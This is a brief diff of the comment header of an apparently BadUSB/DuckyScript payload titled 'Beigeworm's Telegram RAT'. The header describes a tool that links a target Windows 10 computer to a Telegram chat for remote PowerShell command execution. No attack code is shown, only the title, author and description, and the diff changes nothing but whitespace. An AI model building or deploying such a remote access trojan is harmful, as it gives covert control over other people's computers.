@@ -1,7 +1,7 @@
 
 REM Title: Beigeworm's Telegram RAT 
 REM Author: @beigeworm
-REM Description: This script connects target computer with a telegram chat to send powershell commands
+REM Description: This script connects target computer with a telegram chat to send powershell commands 
 REM Target: Windows 10
 
 REM *SETUP*
